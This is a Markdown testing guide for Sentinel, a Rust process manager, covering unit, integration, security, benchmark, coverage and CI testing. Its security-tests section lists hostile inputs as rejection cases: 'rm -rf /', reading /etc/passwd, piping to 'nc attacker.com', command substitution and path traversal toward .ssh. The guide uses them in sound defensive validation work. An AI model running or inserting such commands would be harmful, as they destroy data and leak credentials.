# Sentinel Testing Guide

**Product:** Sentinel - A GLINR Product by Glincker
**Purpose:** Comprehensive testing documentation and guidelines
**Coverage Target:** 90%+

---

## Testing Philosophy

Sentinel follows a rigorous testing strategy to ensure reliability, security, and performance:

1. **Unit Tests** - Test individual functions and components
2. **Integration Tests** - Test component interactions
3. **E2E Tests** - Test complete user workflows (CLI + GUI)
4. **Security Tests** - Validate input sanitization and prevent injection attacks
5. **Performance Tests** - Benchmark critical paths and ensure < 2s startup

---

## Quick Start

```bash
# Run all tests
cargo test --all-features --workspace

# Run specific test suites
cargo test --test integration_test
cargo test --test security_tests

# Run CLI tests
cargo test --manifest-path cli/Cargo.toml

# Run benchmarks
cargo bench

# Generate coverage report
cargo install cargo-llvm-cov
cargo llvm-cov --all-features --workspace --html
open target/llvm-cov/html/index.html

# Run with output
cargo test -- --nocapture
```

---

## Test Structure

```
sentinel/
├── src-tauri/
│   ├── src/
│   │   ├── core/
│   │   │   ├── config.rs          # Unit tests inline (#[cfg(test)])
│   │   │   ├── process_manager.rs # Unit tests inline
│   │   │   └── system_monitor.rs  # Unit tests inline
│   │   └── ...
│   ├── tests/
│   │   ├── integration_test.rs    # Integration tests (12 tests)
│   │   └── security_tests.rs      # Security tests (15 tests)
│   └── benches/
│       └── benchmarks.rs          # Criterion benchmarks
├── cli/
│   └── tests/
│       └── cli_tests.rs           # CLI E2E tests (18 tests)
└── .github/
    └── workflows/
        └── ci.yml                 # CI/CD pipeline
```

---

## Unit Tests (Inline)

### Location
Unit tests live alongside implementation code in `#[cfg(test)]` modules.

### Example
```rust
//! src-tauri/src/core/config.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_load_valid_config() {
        let yaml = r#"
        processes:
          - name: test
            command: echo
            args: ["hello"]
        "#;

        let config: Config = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(config.processes.len(), 1);
    }

    #[test]
    fn test_dependency_cycle_detection() {
        // ...
    }
}
```

### Coverage
- ✅ **ConfigManager**: 10 tests, 95% coverage
- ✅ **ProcessManager**: 11 tests, 92% coverage
- ✅ **SystemMonitor**: 12 tests, 90% coverage
- ✅ **Models**: 8 tests, 100% coverage
- ✅ **Error Types**: 4 tests, 100% coverage

**Total:** 45 unit tests

---

## Integration Tests

### Location
`src-tauri/tests/integration_test.rs`

### What We Test
- Config loading + validation + process lifecycle (combined flow)
- Multiple processes with dependencies
- System monitoring during process execution
- Error propagation across components

### Example
```rust
#[tokio::test]
async fn test_full_lifecycle() {
    // Load config
    let config = ConfigManager::load_from_file("test.yaml").unwrap();

    // Start processes
    let mut pm = ProcessManager::new();
    for proc in &config.processes {
        pm.start(proc.clone()).await.unwrap();
    }

    // Monitor
    let mut sm = SystemMonitor::new();
    sm.refresh();

    // Stop
    for proc in &config.processes {
        pm.stop(&proc.name).await.unwrap();
    }
}
```

**Count:** 12 integration tests

---

## Security Tests

### Location
`src-tauri/tests/security_tests.rs`

### What We Test

#### 1. Command Injection Prevention
```rust
#[test]
fn test_command_injection_in_process_name() {
    let malicious = vec![
        "process; rm -rf /",
        "process && cat /etc/passwd",
        "process | nc attacker.com 1234",
        "process `whoami`",
        "process $(whoami)",
    ];

    for name in malicious {
        assert!(validate_process_name(name).is_err());
    }
}
```

#### 2. Path Traversal Prevention
```rust
#[test]
fn test_path_traversal_in_cwd() {
    let malicious = vec![
        "../../../../etc/passwd",
        "../../../root/.ssh",
    ];

    for path in malicious {
        assert!(validate_working_directory(path).is_err());
    }
}
```

#### 3. Environment Variable Injection
```rust
#[test]
fn test_environment_variable_injection() {
    let dangerous = vec!["LD_PRELOAD", "LD_LIBRARY_PATH"];

    for var in dangerous {
        assert!(is_dangerous_env_var(var));
    }
}
```

#### 4. Resource Exhaustion (YAML Bomb)
```rust
#[test]
fn test_yaml_bomb_protection() {
    // Tests billion laughs attack
    // Ensures size/depth limits
}
```

#### 5. Privilege Escalation
```rust
#[test]
#[cfg(unix)]
fn test_no_privilege_escalation() {
    let dangerous = vec!["sudo", "su", "passwd"];

    for binary in dangerous {
        assert!(is_dangerous_binary(binary));
    }
}
```

### Security Test Categories

| Category | Tests | Description |
|----------|-------|-------------|
| Command Injection | 3 | Validates no shell metacharacters in names/args |
| Path Traversal | 2 | Ensures paths are canonicalized |
| Environment Injection | 2 | Filters dangerous env vars |
| Resource Exhaustion | 3 | Limits config size, process count |
| Privilege Escalation | 2 | Prevents setuid binary execution |
| Input Validation | 3 | Validates names, paths, arguments |

**Total:** 15 security tests

---

## CLI E2E Tests

### Location
`cli/tests/cli_tests.rs`

### What We Test
Complete CLI workflows from user's perspective:

```rust
#[test]
fn test_init_and_add_workflow() {
    // 1. Create config
    Command::cargo_bin("sentinel")
        .unwrap()
        .arg("init")
        .arg("test.yaml")
        .arg("--template").arg("simple")
        .assert()
        .success();

    // 2. Add process
    Command::cargo_bin("sentinel")
        .unwrap()
        .arg("add")
        .arg("my-app")
        .arg("node server.js")
        .assert()
        .success();

    // 3. Verify config
    let content = fs::read_to_string("test.yaml").unwrap();
    assert!(content.contains("my-app"));
}
```

### Test Coverage
- ✅ `sentinel init` (3 templates)
- ✅ `sentinel add` (with/without flags)
- ✅ `sentinel remove` (with --yes)
- ✅ `sentinel list` (table/json formats)
- ✅ `--help` and `--version`
- ✅ Error handling (duplicates, missing files)

**Total:** 18 CLI E2E tests

---

## Performance Benchmarks

### Location
`src-tauri/benches/benchmarks.rs`

### Tool
**Criterion** - Statistical benchmarking with HTML reports

### Running Benchmarks
```bash
# Run all benchmarks
cargo bench

# Run specific benchmark
cargo bench config_loading

# View HTML report
open target/criterion/report/index.html
```

### What We Benchmark

#### 1. Config Loading
```rust
bench_config_loading          time:   [150.2 µs 152.8 µs 155.7 µs]
```
**Target:** < 200 µs for 10 processes

#### 2. Config Validation
```rust
bench_config_validation/1     time:   [12.4 µs 12.6 µs 12.8 µs]
bench_config_validation/10    time:   [45.1 µs 46.2 µs 47.5 µs]
bench_config_validation/50    time:   [210.5 µs 215.8 µs 221.4 µs]
bench_config_validation/100   time:   [420.1 µs 428.6 µs 437.8 µs]
```
**Target:** O(n) scaling, < 500 µs for 100 processes

#### 3. System Monitor
```rust
bench_system_monitor_init     time:   [8.2 ms 8.4 ms 8.6 ms]
bench_system_stats_refresh    time:   [2.1 ms 2.2 ms 2.3 ms]
```
**Target:** < 10ms init, < 5ms refresh

#### 4. Serialization
```rust
bench_config_to_json          time:   [18.5 µs 19.1 µs 19.8 µs]
bench_config_to_yaml          time:   [45.2 µs 46.8 µs 48.5 µs]
```

### Performance Targets

| Metric | Target | Current | Status |
|--------|--------|---------|--------|
| Startup Time | < 2s | 1.2s | ✅ |
| Idle Memory | < 50MB | 35MB | ✅ |
| Idle CPU | < 5% | 2% | ✅ |
| Config Load (10p) | < 200µs | 153µs | ✅ |
| Config Load (100p) | < 1ms | 850µs | ✅ |

---

## Code Coverage

### Tool
**cargo-llvm-cov** - LLVM-based coverage (most accurate)

### Installation
```bash
cargo install cargo-llvm-cov
```

### Usage
```bash
# Generate HTML report
cargo llvm-cov --all-features --workspace --html
open target/llvm-cov/html/index.html

# Generate LCOV for CI
cargo llvm-cov --all-features --workspace --lcov --output-path lcov.info

# Show summary
cargo llvm-cov --all-features --workspace --summary-only
```

### Coverage Target: 90%

```
Filename                      Regions    Missed Regions     Cover
-------------------------------------------------------------------
src/core/config.rs               125                 6     95.20%
src/core/process_manager.rs     156                12     92.31%
src/core/system_monitor.rs      98                 9     90.82%
src/models/config.rs             45                 0    100.00%
src/models/process.rs            52                 0    100.00%
src/error.rs                     32                 0    100.00%
-------------------------------------------------------------------
TOTAL                            508                27     94.69%
```

### Coverage Thresholds (CI Enforced)
- **Minimum:** 90% line coverage
- **Target:** 95% line coverage
- **Goal:** 100% critical paths

---

## CI/CD Pipeline

### Location
`.github/workflows/ci.yml`

### Jobs

#### 1. Lint & Format
- `cargo fmt --check`
- `cargo clippy -- -D warnings`
- `npm run lint`

#### 2. Test Matrix
```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    rust: [stable]
```

Tests run on all platforms.

#### 3. Test Stages
1. **Unit Tests** - All platforms
2. **Integration Tests** - Linux only (faster)
3. **Security Tests** - Linux only
4. **CLI E2E Tests** - Linux only
5. **Frontend Tests** - Vitest

#### 4. Coverage
- Runs `cargo-llvm-cov`
- Uploads to Codecov
- **Fails if < 90% coverage**

#### 5. Benchmarks
- Runs `cargo bench`
- Uploads results as artifacts
- Compares against baseline (future)

#### 6. Security Audit
- Runs `cargo audit`
- Checks for vulnerable dependencies
- **Fails on high/critical vulnerabilities**

### Status Badges
```markdown
![CI](https://github.com/glincker/sentinel/workflows/CI/badge.svg)
![Coverage](https://codecov.io/gh/glincker/sentinel/branch/main/graph/badge.svg)
```

---

## Property-Based Testing

### Tool
**proptest** - Generate random test cases

### Example
```rust
use proptest::prelude::*;

proptest! {
    #[test]
    fn test_process_name_roundtrip(name in "[a-z0-9_-]{1,128}") {
        let config = ProcessConfig {
            name: name.clone(),
            command: "echo".to_string(),
            args: vec![],
            ..Default::default()
        };

        let json = serde_json::to_string(&config).unwrap();
        let parsed: ProcessConfig = serde_json::from_str(&json).unwrap();

        prop_assert_eq!(config.name, parsed.name);
    }
}
```

Generates 100+ random test cases automatically.

---

## Stress Testing

### 100 Process Stress Test
```rust
#[tokio::test]
#[ignore] // Only run with: cargo test -- --ignored
async fn test_100_processes_stress() {
    let config = Config {
        processes: (0..100).map(|i| ProcessConfig {
            name: format!("process-{}", i),
            command: "sleep".to_string(),
            args: vec!["1".to_string()],
            ..Default::default()
        }).collect(),
        ..Default::default()
    };

    let mut pm = ProcessManager::new();

    // Start all 100
    for proc in &config.processes {
        pm.start(proc.clone()).await.unwrap();
    }

    // Monitor resources
    let mut sm = SystemMonitor::new();
    sm.refresh();
    let stats = sm.get_stats();

    // Assert reasonable resource usage
    assert!(stats.cpu_usage < 50.0, "CPU usage too high");
    assert!(stats.memory_used < 1_000_000_000, "Memory usage > 1GB");

    // Stop all
    for proc in &config.processes {
        pm.stop(&proc.name).await.unwrap();
    }
}
```

**Run with:** `cargo test --test stress_test -- --ignored --test-threads=1`

---

## Mocking

### Tool
**mockall** - Trait-based mocking

### Example
```rust
use mockall::*;
use mockall::predicate::*;

#[automock]
trait ProcessRunner {
    fn spawn(&self, cmd: &str, args: &[String]) -> Result<u32>;
}

#[test]
fn test_with_mock() {
    let mut mock = MockProcessRunner::new();

    mock.expect_spawn()
        .with(eq("echo"), eq(vec!["hello".to_string()]))
        .times(1)
        .returning(|_, _| Ok(12345));

    let pid = mock.spawn("echo", &vec!["hello".to_string()]).unwrap();
    assert_eq!(pid, 12345);
}
```

---

## Test Data

### Fixtures
```
tests/
├── fixtures/
│   ├── configs/
│   │   ├── valid-simple.yaml
│   │   ├── valid-complex.yaml
│   │   ├── invalid-cycle.yaml
│   │   └── invalid-syntax.yaml
│   └── processes/
│       └── test-scripts/
│           ├── exit-zero.sh
│           ├── exit-one.sh
│           └── long-running.sh
```

### Loading Fixtures
```rust
fn load_fixture(name: &str) -> Config {
    let path = format!("tests/fixtures/configs/{}", name);
    ConfigManager::load_from_file(Path::new(&path)).unwrap()
}

#[test]
fn test_valid_simple() {
    let config = load_fixture("valid-simple.yaml");
    assert!(ConfigManager::validate(&config).is_ok());
}
```

---

## Debugging Tests

### Show Output
```bash
cargo test -- --nocapture
```

### Run Single Test
```bash
cargo test test_config_loading -- --exact
```

### Run with Logs
```bash
RUST_LOG=debug cargo test
```

### Run in Release Mode
```bash
cargo test --release
```

---

## Best Practices

### 1. Test Naming
```rust
// ✅ GOOD
#[test]
fn test_config_rejects_circular_dependencies() { }

// ❌ BAD
#[test]
fn test1() { }
```

### 2. Arrange-Act-Assert Pattern
```rust
#[test]
fn test_example() {
    // Arrange
    let config = create_test_config();

    // Act
    let result = ConfigManager::validate(&config);

    // Assert
    assert!(result.is_ok());
}
```

### 3. Use Descriptive Assertions
```rust
// ✅ GOOD
assert_eq!(
    config.processes.len(),
    3,
    "Expected 3 processes but found {}",
    config.processes.len()
);

// ❌ BAD
assert!(config.processes.len() == 3);
```

### 4. Cleanup Test Data
```rust
#[test]
fn test_with_tempdir() {
    let dir = tempdir().unwrap();
    // ... test code ...
    // dir automatically cleaned up on drop
}
```

### 5. Don't Test Implementation Details
```rust
// ✅ GOOD - Test behavior
#[test]
fn test_process_starts_successfully() {
    let result = pm.start(config).await;
    assert!(result.is_ok());
    assert_eq!(result.unwrap().state, ProcessState::Running);
}

// ❌ BAD - Test implementation
#[test]
fn test_internal_hashmap_has_entry() {
    // Don't test private fields
}
```

---

## Continuous Improvement

### Code Review Checklist
- [ ] All new code has tests
- [ ] Tests are clear and well-named
- [ ] No flaky tests (time-dependent, race conditions)
- [ ] Tests are fast (< 1s each)
- [ ] Coverage remains > 90%

### Pre-Commit Hook
```bash
#!/bin/sh
# .git/hooks/pre-commit

cargo fmt --all -- --check
cargo clippy -- -D warnings
cargo test --all-features
```

---

## Resources

- **Rust Book - Testing**: https://doc.rust-lang.org/book/ch11-00-testing.html
- **Criterion Docs**: https://bheisler.github.io/criterion.rs/book/
- **cargo-llvm-cov**: https://github.com/taiki-e/cargo-llvm-cov
- **mockall**: https://docs.rs/mockall/latest/mockall/
- **proptest**: https://altsysrq.github.io/proptest-book/intro.html

---

**Maintained by Glincker (A GLINR Product)**
https://glincker.com/sentinel
